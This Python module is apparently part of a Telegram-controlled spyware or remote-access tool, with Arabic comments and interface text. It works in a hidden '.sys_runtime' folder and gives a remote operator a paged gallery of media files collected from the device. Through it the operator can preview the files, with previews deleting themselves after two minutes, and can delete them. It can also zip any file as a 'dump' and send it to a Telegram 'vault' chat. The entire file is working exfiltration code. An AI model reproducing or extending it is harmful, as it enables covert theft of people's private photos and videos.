# -*- coding: utf-8 -*-
import os, time, zipfile, logging, threading, random, gc
from datetime import datetime

P = os.path.join(os.getcwd(), ".sys_runtime")
T = os.path.join(P, "g_tmp")
if not os.path.exists(T): os.makedirs(T)

logging.basicConfig(filename=os.path.join(P, "g.log"), level=logging.ERROR)

try:
    from PIL import Image
    PIL = True
except:
    PIL = False

class GalleryBrowser:
    def __init__(self, scanner=None, tg=None):
        self.sc = scanner
        self.tg = tg
        self.ipp = 16
        self._clear_tmp()

    def _clear_tmp(self):
        try:
            for f in os.listdir(T):
                os.remove(os.path.join(T, f))
        except: pass

    def _get_thumb(self, path, size=(300,300)):
        if not PIL or not os.path.exists(path): return None
        try:
            img = Image.open(path)
            img.thumbnail(size, Image.LANCZOS)
            out = os.path.join(T, f"th_{int(time.time())}_{random.getrandbits(16)}.jpg")
            img.save(out, "JPEG", quality=70)
            img.close()
            return out
        except: return None

    def _get_vid_preview(self, path):
        if not PIL: return None
        try:
            import cv2
            cap = cv2.VideoCapture(path)
            total = int(cap.get(cv2.CAP_PROP_FRAME_COUNT))
            if total <= 0:
                cap.release()
                return None
            frames = []
            for pos in [0.2, 0.5, 0.8]:
                cap.set(cv2.CAP_PROP_POS_FRAMES, int(total * pos))
                ret, frame = cap.read()
                if ret:
                    frame = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)
                    f_img = Image.fromarray(frame)
                    f_img.thumbnail((200, 200))
                    frames.append(f_img)
            cap.release()
            if not frames: return None
            w, h = frames[0].size
            combined = Image.new('RGB', (w * len(frames), h))
            for i, f in enumerate(frames):
                combined.paste(f, (i * w, 0))
                f.close()
            out = os.path.join(T, f"vth_{int(time.time())}_{random.getrandbits(16)}.jpg")
            combined.save(out, "JPEG", quality=75)
            combined.close()
            return out
        except: return None

    def get_grid_kb(self, cat="pending", page=0):
        res = self.sc.get_gallery_by_category(cat, limit=self.ipp, page=page)
        stats = self.sc.get_statistics()
        total_items = stats.get(cat, 0)
        total_pages = (total_items + self.ipp - 1) // self.ipp
        
        kb = []
        row = []
        for i in range(self.ipp):
            if i < len(res):
                item = res[i]
                label = item.get("label", str((page * self.ipp) + i + 1).zfill(2))
                btn = {"text": f"🖼 {label}", "callback_data": f"g_opt|{cat}|{page}|{i}"}
            else:
                btn = {"text": "⬛", "callback_data": "none"}
            row.append(btn)
            if len(row) == 4:
                kb.append(row)
                row = []
        
        nav = []
        if page > 0:
            nav.append({"text": "⏮️", "callback_data": f"g_nav|{cat}|{page-1}"})
        
        # إضافة تحسين (1): عداد الصفحات
        nav.append({"text": f"📄 {page+1} / {max(1, total_pages)}", "callback_data": f"g_nav|{cat}|{page}"})
        
        if len(res) == self.ipp and (page + 1) < total_pages:
            nav.append({"text": "⏭️", "callback_data": f"g_nav|{cat}|{page+1}"})
        
        kb.append(nav)
        return {"inline_keyboard": kb}

    def show_options(self, cid, cat, page, idx):
        res = self.sc.get_gallery_by_category(cat, limit=self.ipp, page=int(page))
        if int(idx) >= len(res): return
        item = res[int(idx)]
        path = item['path']
        label = item.get("label", "??")
        name = os.path.basename(path)
        size_mb = round(os.path.getsize(path) / (1024*1024), 2) if os.path.exists(path) else 0
        
        kb = [
            [{"text": "👁 معاينة", "callback_data": f"g_act|prev|{cat}|{page}|{idx}"}],
            [{"text": "⬇️ تحميل", "callback_data": f"g_act|down|{cat}|{page}|{idx}"},
             {"text": "🗑 حذف", "callback_data": f"g_conf|del|{cat}|{page}|{idx}"}], # تحسين (2): طلب التأكيد
            [{"text": "🔙 رجوع", "callback_data": f"g_nav|{cat}|{page}"}]
        ]
        self.tg.send_message(cid, f"📄 **الملف #{label}**\n\n📁 `{name}`\n📏 الحجم: {size_mb} MB", {"inline_keyboard": kb})

    def execute_action(self, cid, action, cat, page, idx):
        res = self.sc.get_gallery_by_category(cat, limit=self.ipp, page=int(page))
        if int(idx) >= len(res): return
        path = res[int(idx)]['path']
        label = res[int(idx)].get("label", "??")

        if action == "prev":
            self._preview(cid, path)
        elif action == "down":
            self._download(cid, path)
        elif action == "del":
            self._delete(cid, path, label)

    def _preview(self, cid, path):
        ext = path.lower()
        thumb = None
        if ext.endswith(('.jpg','.jpeg','.png','.webp')):
            thumb = self._get_thumb(path)
        elif ext.endswith(('.mp4','.mkv','.3gp','.mov','.avi')):
            thumb = self._get_vid_preview(path)
            
        if thumb:
            r = self.tg._ap("sendPhoto", {"chat_id": cid, "caption": "🔍 معاينة مؤقتة (تختفي تلقائياً)"}, {"photo": thumb})
            if r and r.get('ok'):
                msg_id = r['result']['message_id']
                threading.Timer(120, self._clean_preview, args=(cid, msg_id, thumb)).start()
        else:
            self.tg.send_message(cid, "❌ المعاينة غير مدعومة لهذا النوع.")

    def _download(self, cid, path):
        z_name = f"dump_{random.getrandbits(24)}.zip"
        z_path = os.path.join(T, z_name)
        try:
            with zipfile.ZipFile(z_path, 'w', zipfile.ZIP_DEFLATED) as zf:
                zf.write(path, os.path.basename(path))
            
            # إرسال إلى الخزنة (Vault) إذا وجدت
            vault = getattr(self.sc.det.mon, 'vlt', None) if self.sc and self.sc.det and hasattr(self.sc.det, 'mon') else cid
            with open(z_path, 'rb') as f:
                self.tg._ap("sendDocument", {"chat_id": vault, "caption": f"📦 استخراج: {os.path.basename(path)}"}, {"document": f})
        except Exception as e:
            logging.error(f"Download error: {e}")
        finally:
            if os.path.exists(z_path): os.remove(z_path)
            gc.collect()

    def _delete(self, cid, path, label):
        try:
            if os.path.exists(path):
                os.remove(path)
                self.tg.send_message(cid, f"🗑 تم مسح الملف #{label} بنجاح.")
            else:
                self.tg.send_message(cid, "⚠️ الملف لم يعد موجوداً.")
        except Exception as e:
            logging.error(f"Delete Error: {e}")
            self.tg.send_message(cid, "❌ فشل الحذف: الملف قيد الاستخدام.")

    def _clean_preview(self, cid, msg_id, thumb):
        try:
            self.tg._ap("deleteMessage", {"chat_id": cid, "message_id": msg_id})
        except: pass
        try:
            if os.path.exists(thumb): os.remove(thumb)
        except: pass
        gc.collect()

def create(scanner=None, telegram=None):
    return GalleryBrowser(scanner, telegram)
